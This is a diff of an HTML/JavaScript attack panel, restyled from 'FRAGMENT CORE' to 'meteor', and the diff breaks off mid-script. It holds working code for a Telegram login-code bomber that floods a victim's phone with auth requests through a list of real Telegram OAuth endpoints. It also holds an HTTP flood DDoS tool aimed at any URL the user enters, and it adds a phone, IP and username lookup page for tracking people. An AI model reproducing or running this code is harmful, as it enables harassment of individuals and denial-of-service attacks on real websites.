@@ -2,8 +2,8 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>FRAGMENT CORE | TERMINAL</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>meteor</title>
     <style>
         * {
             margin: 0;
@@ -11,585 +11,853 @@
             box-sizing: border-box;
         }
 
-        :root {
-            --glow: #b77cff;
-            --glow-cyan: #00ffcc;
-            --glow-pink: #ff44aa;
-            --glow-red: #ff4444;
-            --bg: #0a0a0f;
-            --card: rgba(8, 5, 18, 0.9);
-            --border: #4a2a8a;
-            --text: #e0d0ff;
-        }
-
         body {
-            background: radial-gradient(circle at 30% 20%, #1a0a3a, #050510);
-            font-family: 'Fira Code', 'Courier New', monospace;
-            min-height: 100vh;
-            padding: 15px;
-            position: relative;
-            overflow-x: hidden;
-        }
-
-        .particles {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 0;
-        }
-        .particle {
-            position: absolute;
-            background: rgba(170, 68, 255, 0.4);
-            border-radius: 50%;
-            filter: blur(3px);
-            animation: float linear infinite;
-        }
-        @keyframes float {
-            0% { transform: translateY(100vh) translateX(0); opacity: 0; }
-            10% { opacity: 0.5; }
-            90% { opacity: 0.3; }
-            100% { transform: translateY(-20vh) translateX(40px); opacity: 0; }
-        }
-
-        .wrapper {
+            background: #0d0d0d;
+            color: #e0e0e0;
+            font-family: 'Segoe UI', 'Fira Code', monospace;
+            height: 100vh;
+            overflow: hidden;
             display: flex;
-            gap: 15px;
-            max-width: 1400px;
-            margin: 0 auto;
-            position: relative;
-            z-index: 10;
         }
 
-        /* sidebar */
+        /* ===== SIDEBAR ===== */
         .sidebar {
-            width: 75px;
-            background: rgba(5, 3, 12, 0.85);
-            backdrop-filter: blur(12px);
-            border-radius: 28px;
-            border: 1px solid var(--glow);
-            padding: 20px 0;
+            width: 210px;
+            background: #141414;
+            border-right: 1px solid #2a2a2a;
+            padding: 28px 0;
             display: flex;
             flex-direction: column;
-            align-items: center;
-            gap: 25px;
-        }
-        .icon {
-            width: 48px;
-            height: 48px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            cursor: pointer;
-            border-radius: 16px;
-            transition: 0.2s;
-            color: #aa88ff;
-        }
-        .icon:hover {
-            background: rgba(170, 68, 255, 0.2);
-            color: white;
-        }
-        .icon.active {
-            background: linear-gradient(135deg, #aa44ff, #8822cc);
-            color: white;
-            box-shadow: 0 0 12px var(--glow);
+            height: 100%;
+            user-select: none;
         }
 
-        /* main */
+        .brand {
+            font-size: 1.5rem;
+            font-weight: 700;
+            text-align: center;
+            padding: 0 10px 32px;
+            color: #f0f0f0;
+            letter-spacing: 1.5px;
+        }
+        .brand span {
+            color: #888;
+        }
+
+        .nav-item {
+            padding: 11px 26px;
+            margin: 3px 14px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: 0.15s;
+            font-weight: 500;
+            color: #888;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            font-size: 0.95rem;
+        }
+        .nav-item:hover {
+            background: #1e1e1e;
+            color: #fff;
+        }
+        .nav-item.active {
+            background: #1e1e1e;
+            color: #fff;
+            box-shadow: inset 3px 0 0 #aaa;
+        }
+        .nav-item i { font-size: 1.2rem; width: 26px; text-align: center; }
+
+        /* ===== MAIN ===== */
         .main {
             flex: 1;
-            background: var(--card);
-            backdrop-filter: blur(12px);
-            border-radius: 28px;
-            border: 1px solid var(--glow);
-            overflow: hidden;
+            padding: 28px 36px;
+            overflow-y: auto;
+            height: 100vh;
+            background: #0d0d0d;
         }
 
-        .header {
-            background: rgba(0,0,0,0.5);
-            padding: 12px 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid #3a1a6a;
-            flex-wrap: wrap;
-        }
-        .logo {
-            font-size: 1.1rem;
-            font-weight: bold;
-            background: linear-gradient(135deg, #e0aaff, #cc77ff);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-        .node {
-            font-size: 0.65rem;
-            background: #1a0a2e;
-            padding: 4px 12px;
-            border-radius: 20px;
-            color: #bb99ff;
-        }
-        .clock {
-            font-size: 0.7rem;
-            color: #bb99ff;
-        }
-
-        /* панели */
-        .panel {
+        .page {
             display: none;
-            padding: 24px;
             animation: fade 0.2s ease;
         }
-        .panel.active {
-            display: block;
-        }
+        .page.active { display: block; }
+
         @keyframes fade {
-            from { opacity: 0; transform: translateY(8px); }
+            from { opacity: 0; transform: translateY(6px); }
             to { opacity: 1; transform: translateY(0); }
         }
 
-        .stats {
+        .page-title {
+            font-size: 1.6rem;
+            font-weight: 600;
+            margin-bottom: 24px;
+            color: #fff;
+            letter-spacing: 0.5px;
+        }
+        .page-title i { margin-right: 12px; }
+
+        .grid-2 {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
-            gap: 20px;
-            margin-bottom: 25px;
-        }
-        .stat-card {
-            background: rgba(0,0,0,0.4);
-            border-radius: 20px;
-            padding: 16px;
-            border: 1px solid #4a2a7a;
-            text-align: center;
-        }
-        .stat-num {
-            font-size: 1.8rem;
-            font-weight: bold;
-            color: #cc88ff;
-        }
-        .stat-label {
-            font-size: 0.65rem;
-            letter-spacing: 1px;
-            color: #aa99ff;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
         }
 
-        .progress {
-            background: #1a1a2a;
-            border-radius: 20px;
-            height: 6px;
-            margin: 15px 0;
-            overflow: hidden;
-        }
-        .progress-fill {
-            background: linear-gradient(90deg, var(--glow), #dd88ff);
-            width: 0%;
-            height: 100%;
-            transition: width 0.1s;
-        }
-
-        canvas {
-            background: #03030a;
-            border-radius: 16px;
-            width: 100%;
-            height: 100px;
-            margin: 15px 0;
-        }
-
-        .recent {
-            background: #05030f;
-            border-radius: 20px;
-            padding: 16px;
-            max-height: 180px;
-            overflow-y: auto;
-            font-size: 0.7rem;
-        }
-
-        .input-group {
-            margin-bottom: 18px;
-        }
-        label {
-            display: block;
-            font-size: 0.7rem;
-            letter-spacing: 1px;
-            color: #cc99ff;
-            margin-bottom: 6px;
-        }
-        input, select {
-            width: 100%;
-            background: #0c0c14;
-            border: 1px solid #4a2a7a;
-            padding: 12px 16px;
-            border-radius: 30px;
-            color: #f0e0ff;
-            font-family: monospace;
-        }
-        input:focus, select:focus {
-            border-color: var(--glow);
-            outline: none;
-        }
-        button {
-            background: linear-gradient(95deg, #7b2cbf, #b44cff);
-            border: none;
-            padding: 12px;
-            width: 100%;
-            border-radius: 30px;
-            font-weight: bold;
-            color: white;
-            cursor: pointer;
+        .card {
+            background: #141414;
+            border: 1px solid #2a2a2a;
+            border-radius: 18px;
+            padding: 20px 24px;
+            margin-bottom: 20px;
             transition: 0.2s;
         }
-        button:hover {
-            transform: scale(0.98);
-            box-shadow: 0 0 12px var(--glow);
+        .card:hover { border-color: #444; }
+
+        .card-title {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            color: #888;
+            letter-spacing: 1px;
+            margin-bottom: 16px;
+            border-bottom: 1px solid #222;
+            padding-bottom: 8px;
         }
 
+        .input-group { margin-bottom: 16px; }
+        .input-group label {
+            display: block;
+            font-size: 0.75rem;
+            color: #888;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .input-group input {
+            width: 100%;
+            background: #1a1a1a;
+            border: 1px solid #2a2a2a;
+            border-radius: 12px;
+            padding: 10px 14px;
+            color: #eee;
+            font-family: monospace;
+            transition: 0.15s;
+        }
+        .input-group input:focus {
+            border-color: #666;
+            outline: none;
+        }
+
+        .btn {
+            background: #2a2a2a;
+            border: none;
+            padding: 10px 0;
+            width: 100%;
+            border-radius: 30px;
+            font-weight: 600;
+            color: #fff;
+            cursor: pointer;
+            transition: 0.15s;
+            font-family: inherit;
+            letter-spacing: 0.5px;
+        }
+        .btn:hover { background: #3a3a3a; }
+
+        .btn-danger { background: #3a1a1a; }
+        .btn-danger:hover { background: #4a2a2a; }
+
         .log-area {
-            background: #03030a;
-            border-radius: 20px;
-            padding: 12px;
-            margin-top: 20px;
+            background: #0a0a0a;
+            border-radius: 14px;
+            padding: 12px 16px;
             max-height: 220px;
             overflow-y: auto;
-            font-size: 0.7rem;
+            font-family: monospace;
+            font-size: 0.75rem;
+            border: 1px solid #1a1a1a;
+            margin-top: 12px;
         }
         .log-line {
             padding: 4px 0;
-            border-bottom: 1px dotted #2a1a4a;
+            border-bottom: 1px solid #161616;
         }
-        .success { color: #88ffaa; }
-        .error { color: #ff8888; }
-        .info { color: #bb99ff; }
+        .log-success { color: #8bc34a; }
+        .log-error { color: #e57373; }
+        .log-info { color: #90a4ae; }
 
-        .cmdline {
-            background: #03030f;
-            border-top: 1px solid #3a1a6a;
-            padding: 12px 20px;
+        .stat-row {
             display: flex;
-            gap: 10px;
-            align-items: center;
-        }
-        .cmd-prompt { color: #cc77ff; font-weight: bold; }
-        .cmd-input {
-            background: transparent;
-            border: none;
-            color: #e0ccff;
-            flex: 1;
-            outline: none;
-            font-family: monospace;
-        }
-
-        .theme-group {
-            display: flex;
-            gap: 12px;
+            gap: 16px;
             flex-wrap: wrap;
-            margin-top: 10px;
+            margin-bottom: 20px;
         }
-        .theme-btn {
-            background: #1e1a2a;
-            border: 1px solid #6a3a9a;
-            padding: 6px 16px;
-            border-radius: 30px;
-            cursor: pointer;
-            font-size: 0.75rem;
-            color: #ccaaee;
+        .stat-box {
+            background: #141414;
+            border-radius: 14px;
+            padding: 14px 20px;
+            border: 1px solid #222;
+            flex: 1;
+            min-width: 110px;
         }
-        .theme-btn.active {
-            background: var(--glow);
-            color: black;
+        .stat-box .num {
+            font-size: 1.6rem;
+            font-weight: bold;
+            color: #fff;
+        }
+        .stat-box .lbl {
+            font-size: 0.6rem;
+            color: #888;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
 
-        .footer {
-            text-align: center;
-            padding: 12px;
-            font-size: 0.6rem;
-            color: #6a4a9a;
-            border-top: 1px solid #2a1a4a;
+        .progress-bar {
+            background: #1a1a1a;
+            border-radius: 30px;
+            height: 5px;
+            overflow: hidden;
+            margin: 10px 0;
         }
-        @media (max-width: 700px) {
-            .sidebar { width: 60px; }
-            .icon { width: 40px; height: 40px; font-size: 20px; }
+        .progress-fill {
+            background: #888;
+            height: 100%;
+            width: 0%;
+            transition: width 0.1s linear;
+        }
+
+        .recent { background: #0a0a0a; border-radius: 14px; padding: 14px; max-height: 150px; overflow-y: auto; font-size: 0.7rem; }
+
+        /* ===== REPORT MODAL ===== */
+        .report-modal {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(4px);
+            z-index: 1000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .report-modal.active { display: flex; }
+
+        .report-card {
+            background: #141414;
+            border: 1px solid #444;
+            border-radius: 24px;
+            max-width: 700px;
+            width: 100%;
+            max-height: 80vh;
+            padding: 28px 32px;
+            overflow-y: auto;
+            color: #ddd;
+            box-shadow: 0 0 40px rgba(0,0,0,0.6);
+        }
+        .report-card h2 {
+            color: #fff;
+            font-size: 1.4rem;
+            margin-bottom: 14px;
+            border-bottom: 2px solid #333;
+            padding-bottom: 10px;
+        }
+        .report-card .report-data {
+            font-family: monospace;
+            font-size: 0.85rem;
+            white-space: pre-wrap;
+            line-height: 1.7;
+        }
+        .report-actions {
+            display: flex;
+            gap: 14px;
+            margin-top: 22px;
+            flex-wrap: wrap;
+        }
+        .report-actions button {
+            background: #2a2a2a;
+            border: none;
+            padding: 10px 22px;
+            border-radius: 40px;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.15s;
+            flex: 1;
+            min-width: 100px;
+        }
+        .report-actions button:hover { background: #3a3a3a; }
+        .report-actions .close-report { background: #1a1a1a; color: #888; }
+        .report-actions .close-report:hover { background: #2a2a2a; color: #fff; }
+
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: #141414; }
+        ::-webkit-scrollbar-thumb { background: #555; border-radius: 10px; }
+
+        @media (max-width: 800px) {
+            .grid-2 { grid-template-columns: 1fr; }
+            .sidebar { width: 70px; padding: 12px 0; }
+            .brand { font-size: 0.9rem; padding-bottom: 20px; }
+            .nav-item { padding: 10px 12px; font-size: 0; margin: 3px 8px; }
+            .nav-item i { font-size: 1.3rem; }
+            .main { padding: 16px; }
         }
     </style>
 </head>
 <body>
-<div class="particles" id="particles"></div>
-<div class="wrapper">
+
+    <!-- ===== SIDEBAR ===== -->
     <div class="sidebar">
-        <div class="icon" data-page="dashboard">🏠</div>
-        <div class="icon" data-page="sms">💣</div>
-        <div class="icon" data-page="ddos">🌐</div>
-        <div class="icon" data-page="settings">⚙️</div>
-        <div class="icon" data-page="logs">📜</div>
+        <div class="brand">meteor<span>.</span></div>
+        <div class="nav-item active" data-page="home"><i>⌂</i> <span>Home</span></div>
+        <div class="nav-item" data-page="spam"><i>⚡</i> <span>Spam Kod</span></div>
+        <div class="nav-item" data-page="ddos"><i>⊹</i> <span>DDoS</span></div>
+        <div class="nav-item" data-page="search"><i>◈</i> <span>Search</span></div>
+        <div class="nav-item" data-page="settings"><i>⚙</i> <span>Settings</span></div>
+        <div class="nav-item" data-page="logs"><i>≡</i> <span>Log</span></div>
     </div>
 
+    <!-- ===== MAIN ===== -->
     <div class="main">
-        <div class="header">
-            <div class="logo">✦ FRAGMENT CORE ✦</div>
-            <div class="node">🌐 Node: RU-17</div>
-            <div class="clock" id="clock"></div>
-        </div>
 
-        <!-- дашборд -->
-        <div id="dashboard" class="panel active">
-            <div class="stats">
-                <div class="stat-card"><div class="stat-num" id="reqTotal">0</div><div class="stat-label">REQUESTS</div></div>
-                <div class="stat-card"><div class="stat-num" id="uptime">00:00:00</div><div class="stat-label">UPTIME</div></div>
-                <div class="stat-card"><div class="stat-num" id="successRate">100%</div><div class="stat-label">SUCCESS</div></div>
+        <!-- HOME -->
+        <div id="page-home" class="page active">
+            <div class="page-title"><i>⌂</i> Dashboard</div>
+            <div class="stat-row">
+                <div class="stat-box"><div class="num" id="reqTotal">0</div><div class="lbl">Requests</div></div>
+                <div class="stat-box"><div class="num" id="uptime">00:00:00</div><div class="lbl">Uptime</div></div>
+                <div class="stat-box"><div class="num" id="successRate">100%</div><div class="lbl">Success</div></div>
             </div>
-            <div class="progress"><div class="progress-fill" id="coreFill" style="width: 86%"></div></div>
-            <canvas id="chart" width="400" height="100"></canvas>
-            <div class="recent" id="recentLog"></div>
+            <div class="card">
+                <div class="card-title">System</div>
+                <div class="progress-bar"><div class="progress-fill" id="coreFill" style="width:86%"></div></div>
+            </div>
+            <div class="card">
+                <div class="card-title">Recent Activity</div>
+                <div class="recent" id="recentLog"></div>
+            </div>
         </div>
 
-        <!-- sms -->
-        <div id="sms" class="panel">
-            <div class="input-group"><label>📞 НОМЕР (с +)</label><input type="tel" id="smsPhone" value="+7"></div>
-            <div class="input-group"><label>🔄 ЦИКЛЫ (1 цикл = 5 запросов)</label><input type="number" id="smsCycles" value="3" min="1" max="30"></div>
-            <button id="smsBtn">💣 ЗАПУСТИТЬ</button>
-            <div class="log-area" id="smsLog"></div>
+        <!-- SPAM -->
+        <div id="page-spam" class="page">
+            <div class="page-title"><i>⚡</i> Spam Kod</div>
+            <div class="card">
+                <div class="card-title">Telegram Code Bomber</div>
+                <div class="input-group"><label>📞 Phone (with +)</label><input type="tel" id="smsPhone" value="+7"></div>
+                <div class="input-group"><label>🔄 Cycles (1 cycle = 5 requests)</label><input type="number" id="smsCycles" value="3" min="1" max="30"></div>
+                <button class="btn" id="smsBtn">▶ Launch</button>
+                <div class="log-area" id="smsLog"></div>
+            </div>
         </div>
 
-        <!-- ddos -->
-        <div id="ddos" class="panel">
-            <div class="input-group"><label>🎯 URL</label><input type="text" id="ddosUrl" placeholder="https://example.com"></div>
-            <div class="input-group"><label>⚡ ПОТОКИ (1-200)</label><input type="number" id="ddosThreads" value="60"></div>
-            <div class="input-group"><label>⏱️ СЕКУНД</label><input type="number" id="ddosDuration" value="30"></div>
-            <button id="ddosBtn">💥 ЗАПУСТИТЬ</button>
-            <div class="progress" id="ddosProgress" style="display:none; margin-top:15px"><div class="progress-fill" id="ddosFill"></div></div>
-            <div class="log-area" id="ddosLog"></div>
+        <!-- DDOS -->
+        <div id="page-ddos" class="page">
+            <div class="page-title"><i>⊹</i> DDoS Attack</div>
+            <div class="card">
+                <div class="card-title">HTTP Flood</div>
+                <div class="input-group"><label>🎯 Target URL</label><input type="text" id="ddosUrl" placeholder="https://example.com"></div>
+                <div class="input-group"><label>⚡ Threads (1-200)</label><input type="number" id="ddosThreads" value="60"></div>
+                <div class="input-group"><label>⏱️ Duration (sec)</label><input type="number" id="ddosDuration" value="30"></div>
+                <button class="btn btn-danger" id="ddosBtn">▶ Launch</button>
+                <div class="progress-bar" id="ddosProgress" style="display:none; margin-top:12px"><div class="progress-fill" id="ddosFill"></div></div>
+                <div class="log-area" id="ddosLog"></div>
+            </div>
         </div>
 
-        <!-- настройки -->
-        <div id="settings" class="panel">
-            <div class="input-group"><label>🎨 ЦВЕТ</label><div class="theme-group"><div class="theme-btn" data-theme="purple">Purple</div><div class="theme-btn" data-theme="cyan">Cyan</div><div class="theme-btn" data-theme="pink">Pink</div><div class="theme-btn" data-theme="red">Red</div></div></div>
-            <div class="input-group"><label>🔤 ШРИФТ</label><select id="fontSelect"><option>Fira Code</option><option>JetBrains Mono</option><option>Consolas</option></select></div>
-            <div class="input-group"><label>✨ СВЕЧЕНИЕ</label><input type="range" id="glowRange" min="0" max="20" value="12"></div>
-            <div class="input-group"><label>🔊 ЗВУК</label><select id="soundSelect"><option value="on">Вкл</option><option value="off">Выкл</option></select></div>
-            <div class="input-group"><label>🎨 ЧАСТИЦЫ</label><input type="range" id="particleRange" min="0" max="100" value="50"></div>
-            <button id="resetBtn">💀 СБРОС НАСТРОЕК</button>
+        <!-- SEARCH (расширенный) -->
+        <div id="page-search" class="page">
+            <div class="page-title"><i>◈</i> Search</div>
+            <div class="grid-2">
+                <div class="card">
+                    <div class="card-title">📱 Phone Number</div>
+                    <div class="input-group"><input type="text" id="searchPhone" placeholder="+7 999 123 45 67"></div>
+                    <button class="btn" id="searchPhoneBtn">▶ Search</button>
+                    <div class="log-area" id="searchPhoneLog" style="max-height:120px;"></div>
+                </div>
+                <div class="card">
+                    <div class="card-title">🌐 IP Address</div>
+                    <div class="input-group"><input type="text" id="searchIp" placeholder="8.8.8.8"></div>
+                    <button class="btn" id="searchIpBtn">▶ Search</button>
+                    <div class="log-area" id="searchIpLog" style="max-height:120px;"></div>
+                </div>
+                <div class="card">
+                    <div class="card-title">🔄 MNP (by phone)</div>
+                    <div class="input-group"><input type="text" id="searchMnp" placeholder="+7 999 123 45 67"></div>
+                    <button class="btn" id="searchMnpBtn">▶ Search</button>
+                    <div class="log-area" id="searchMnpLog" style="max-height:120px;"></div>
+                </div>
+                <div class="card">
+                    <div class="card-title">🔎 Username (socials)</div>
+                    <div class="input-group"><input type="text" id="searchUsername" placeholder="@username"></div>
+                    <button class="btn" id="searchUsernameBtn">▶ Search</button>
+                    <div class="log-area" id="searchUsernameLog" style="max-height:120px;"></div>
+                </div>
+            </div>
         </div>
 
-        <!-- логи -->
-        <div id="logs" class="panel">
-            <div class="log-area" id="globalLog" style="height: 300px;"></div>
-            <div style="display: flex; gap: 12px; margin-top: 16px;"><button id="clearLogs">🗑️ ОЧИСТИТЬ</button><button id="copyLogs">📋 КОПИРОВАТЬ</button></div>
+        <!-- SETTINGS -->
+        <div id="page-settings" class="page">
+            <div class="page-title"><i>⚙</i> Settings</div>
+            <div class="card">
+                <div class="card-title">Appearance</div>
+                <div class="input-group"><label>🔤 Font</label><select id="fontSelect"><option>Fira Code</option><option>JetBrains Mono</option><option>Consolas</option></select></div>
+                <div class="input-group"><label>🔊 Sound effects</label><select id="soundSelect"><option value="on">On</option><option value="off">Off</option></select></div>
+                <button class="btn btn-danger" id="resetBtn">⟲ Reset all settings</button>
+            </div>
         </div>
 
-        <div class="cmdline">
-            <span class="cmd-prompt">$></span>
-            <input type="text" class="cmd-input" id="cmd" placeholder="help | clear | status | theme purple">
+        <!-- LOGS -->
+        <div id="page-logs" class="page">
+            <div class="page-title"><i>≡</i> System Log</div>
+            <div class="card">
+                <div class="log-area" id="globalLog" style="max-height:400px;"></div>
+                <div style="display:flex; gap:12px; margin-top:16px;">
+                    <button class="btn" id="clearLogs" style="background:#1a1a1a;">✕ Clear</button>
+                    <button class="btn" id="copyLogs" style="background:#1a1a1a;">⎘ Copy</button>
+                </div>
+            </div>
         </div>
-        <div class="footer">⚡ FRAGMENT CORE | @cat_winger</div>
     </div>
-</div>
 
-<script>
-    // --- данные
-    let total = 0, success = 0;
-    let start = Date.now();
-    let sound = true;
-    let ddosActive = false;
-    let chartData = Array(20).fill(0);
-    let ctx;
+    <!-- ===== REPORT MODAL ===== -->
+    <div class="report-modal" id="reportModal">
+        <div class="report-card" id="reportCard">
+            <h2 id="reportTitle">📄 Report</h2>
+            <div class="report-data" id="reportContent"></div>
+            <div class="report-actions">
+                <button id="downloadReportBtn">⬇ Download .txt</button>
+                <button id="copyReportBtn">⎘ Copy</button>
+                <button class="close-report" id="closeReportBtn">✕ Close</button>
+            </div>
+        </div>
+    </div>
 
-    // --- логи
-    function log(msg, type = 'info', target = null) {
-        const line = `<div class="log-line ${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
-        if (target) {
-            target.insertAdjacentHTML('beforeend', line);
-            target.scrollTop = target.scrollHeight;
-        }
-        const global = document.getElementById('globalLog');
-        if (global) {
-            global.insertAdjacentHTML('beforeend', line);
-            global.scrollTop = global.scrollHeight;
-        }
-        const recent = document.getElementById('recentLog');
-        if (recent) {
-            recent.insertAdjacentHTML('beforeend', line);
-            if (recent.children.length > 15) recent.removeChild(recent.children[0]);
-            recent.scrollTop = recent.scrollHeight;
-        }
-    }
+    <script>
+        // ============================================================
+        //  DATA
+        // ============================================================
+        let total = 0, success = 0;
+        let start = Date.now();
+        let sound = true;
+        let ddosActive = false;
+        let lastReportData = '';
 
-    function beep() { if(sound) { try { new Audio('data:audio/wav;base64,U3RlYWx0aCBzb3VuZA==').play().catch(()=>{}); } catch(e) {} } }
-
-    // --- обновление статистики
-    function updateStats() {
-        document.getElementById('reqTotal').innerText = total;
-        let sec = Math.floor((Date.now() - start) / 1000);
-        let h = String(Math.floor(sec / 3600)).padStart(2,'0');
-        let m = String(Math.floor((sec % 3600) / 60)).padStart(2,'0');
-        let s = String(sec % 60).padStart(2,'0');
-        document.getElementById('uptime').innerText = `${h}:${m}:${s}`;
-        let rate = total === 0 ? 100 : Math.floor((success / total) * 100);
-        document.getElementById('successRate').innerText = rate + '%';
-        chartData.push(rate);
-        if(chartData.length > 20) chartData.shift();
-        if(ctx) {
-            ctx.clearRect(0,0,400,100);
-            ctx.beginPath();
-            ctx.strokeStyle = getComputedStyle(document.documentElement).getPropertyValue('--glow') || '#b77cff';
-            ctx.lineWidth = 2;
-            for(let i=0;i<chartData.length;i++) {
-                let x = i*20;
-                let y = 100 - chartData[i]*0.8;
-                if(i===0) ctx.moveTo(x,y);
-                else ctx.lineTo(x,y);
+        // ============================================================
+        //  LOGGING
+        // ============================================================
+        function log(msg, type = 'info', target = null) {
+            const line = `<div class="log-line log-${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            if (target) {
+                target.insertAdjacentHTML('beforeend', line);
+                target.scrollTop = target.scrollHeight;
             }
-            ctx.stroke();
+            const global = document.getElementById('globalLog');
+            if (global) {
+                global.insertAdjacentHTML('beforeend', line);
+                global.scrollTop = global.scrollHeight;
+            }
+            const recent = document.getElementById('recentLog');
+            if (recent) {
+                recent.insertAdjacentHTML('beforeend', line);
+                if (recent.children.length > 15) recent.removeChild(recent.children[0]);
+                recent.scrollTop = recent.scrollHeight;
+            }
         }
-    }
-    setInterval(updateStats, 1000);
 
-    // --- sms
-    const endpoints = [
-        'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
-        'https://translations.telegram.org/auth/request',
-        'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
-        'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
-        'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
-        'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
-        'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
-        'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
-        'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
-        'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
-        'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
-        'https://my.telegram.org/auth/send_password'
-    ];
-    function ua() { return ['Windows NT 10.0','Mac OS X','Linux x86_64'][Math.floor(Math.random()*3)]; }
-    async function sendBatch(phone) {
-        let shuffled = [...endpoints];
-        for(let i=shuffled.length-1;i>0;i--){ let j=Math.floor(Math.random()*(i+1)); [shuffled[i],shuffled[j]]=[shuffled[j],shuffled[i]]; }
-        let ok=0;
-        for(let ep of shuffled.slice(0,5)) {
-            try{
-                await fetch(ep,{method:'POST',headers:{'User-Agent':ua(),'Content-Type':'application/x-www-form-urlencoded'},body:`phone=${encodeURIComponent(phone)}`,mode:'no-cors'});
-                ok++; total++; success++;
-            }catch(e){ total++; }
-            await new Promise(r=>setTimeout(r,200));
+        function beep() {
+            if (sound) {
+                try { new Audio('data:audio/wav;base64,U3RlYWx0aCBzb3VuZA==').play().catch(()=>{}); } catch(e) {}
+            }
         }
-        return ok;
-    }
-    document.getElementById('smsBtn').onclick = async () => {
-        let phone = document.getElementById('smsPhone').value.trim();
-        let cycles = parseInt(document.getElementById('smsCycles').value);
-        if(!phone.startsWith('+')) { log('❌ номер должен начинаться с +', 'error', document.getElementById('smsLog')); return; }
-        let btn = document.getElementById('smsBtn');
-        btn.disabled = true; btn.innerText = '⏳ ...';
-        log(`🚀 СМС на ${phone} | ${cycles} циклов`, 'info', document.getElementById('smsLog'));
-        for(let c=1;c<=cycles;c++) {
-            let sent = await sendBatch(phone);
-            log(`✅ цикл ${c}/${cycles}: ${sent}/5`, 'success', document.getElementById('smsLog'));
-            if(c<cycles) await new Promise(r=>setTimeout(r,2500));
-        }
-        btn.disabled = false; btn.innerText = '💣 ЗАПУСТИТЬ';
-        beep();
-        log('🏁 завершено', 'success', document.getElementById('smsLog'));
-    };
 
-    // --- ddos
-    async function flood(url) { if(!ddosActive) return; try{ await fetch(url,{mode:'no-cors',cache:'no-store'}); total++; success++; }catch(e){ total++; } }
-    document.getElementById('ddosBtn').onclick = () => {
-        let url = document.getElementById('ddosUrl').value.trim();
-        let threads = parseInt(document.getElementById('ddosThreads').value);
-        let duration = parseInt(document.getElementById('ddosDuration').value);
-        if(!url) { log('❌ введите url', 'error', document.getElementById('ddosLog')); return; }
-        if(!url.startsWith('http')) url = 'https://'+url;
-        let btn = document.getElementById('ddosBtn');
-        btn.disabled = true; btn.innerText = '💢 ...';
-        let prog = document.getElementById('ddosProgress');
-        let fill = document.getElementById('ddosFill');
-        prog.style.display = 'block';
-        fill.style.width = '0%';
-        ddosActive = true;
-        log(`🔥 DDoS на ${url} | потоки ${threads} | ${duration}сек`, 'info', document.getElementById('ddosLog'));
-        let startTime = Date.now();
-        let interval = setInterval(()=>{ for(let i=0;i<threads;i++) flood(url); let p = Math.min(100, ((Date.now()-startTime)/(duration*1000))*100); fill.style.width = p+'%'; }, 40);
-        setTimeout(()=>{
-            ddosActive = false;
-            clearInterval(interval);
-            prog.style.display = 'none';
-            btn.disabled = false; btn.innerText = '💥 ЗАПУСТИТЬ';
+        // ============================================================
+        //  STATS
+        // ============================================================
+        function updateStats() {
+            document.getElementById('reqTotal').innerText = total;
+            let sec = Math.floor((Date.now() - start) / 1000);
+            let h = String(Math.floor(sec / 3600)).padStart(2,'0');
+            let m = String(Math.floor((sec % 3600) / 60)).padStart(2,'0');
+            let s = String(sec % 60).padStart(2,'0');
+            document.getElementById('uptime').innerText = `${h}:${m}:${s}`;
+            let rate = total === 0 ? 100 : Math.floor((success / total) * 100);
+            document.getElementById('successRate').innerText = rate + '%';
+        }
